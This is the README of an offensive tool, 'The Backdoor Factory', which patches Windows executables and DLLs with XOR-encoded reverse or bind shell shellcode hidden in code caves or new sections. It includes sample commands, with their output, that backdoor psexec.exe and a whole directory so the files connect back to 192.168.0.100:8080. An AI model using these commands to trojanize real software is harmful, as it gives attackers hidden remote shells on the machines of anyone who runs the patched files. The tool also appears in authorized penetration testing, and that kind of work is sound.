##The Backdoor Factory
Backdoors win32 PE files, to continue normal file execution (if the shellcode supports it), by patching the exe/dll directly.

Usage: ./backdoor.py -h

Features:

-After making a copy of the target file, the file copy will be patched directly.

-Finding all codecaves in an EXE/DLL.

-Injecting modified reverse/bind shells that allow continued execution after connection to the attacker.

-Modifying the PE/COFF header to add an additional section for all win32 executables/dlls, including those with an import table.

-Using the existing shellcode options, the ability to select PORT and HOST as connection options

-The ability to backdoor a directory of executables/dlls

-List all codecaves in the exe/dll

-Select the codecave in the exe/dll to backdoor, thereby not changing the filesize.

-Includes a simple XOR shellcode encoder.

---------------------------------------------
Sample Usage:

#Backdoor a exe/dll using an existing code cave:

./backdoor.py -f psexec.exe -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -e xor_encode 

The following caves can be used to inject code and possibly continue execution
use a number greater than the highest reference to add a code cave to the executable/dll
versus using an existing code cave.. Good luck:

1 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d2d5 End: 0x2d4d0; Cave Size: 507

2 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d4e9 End: 0x2d6d5; Cave Size: 492

3 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d6e3 End: 0x2d8d8; Cave Size: 501

4 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d8f1 End: 0x2dadd; Cave Size: 492

5 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2dae7 End: 0x2dce0; Cave Size: 505

6 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2dcf3 End: 0x2dee5; Cave Size: 498

7 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2defb End: 0x2e0ea; Cave Size: 495

8 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2e161 End: 0x2e390; Cave Size: 559

9 Section Name: .rsrc; Section Begin: 0x2f200 End: 0x5bc00; Cave begin: 0x2f578 End: 0x2f708; Cave Size: 400

10 Section Name: .rsrc; Section Begin: 0x2f200 End: 0x5bc00; Cave begin: 0x58a39 End: 0x58c68; Cave Size: 559

Enter your selection: 2

Using selection: 2

psexec.exe backdooring complete

File bd.psexec.exe is in current directory


---

#Backdoor an exe/dll by adding a code section:

./backdoor.py -f psexec.exe -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a -e xor_encode

Adding a new section to the exe/dll for shellcode injection

psexec.exe backdooring complete

File bd.psexec.exe is in current directory

---
#Backdoor a directory of exes:
./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a


...output too long for README...
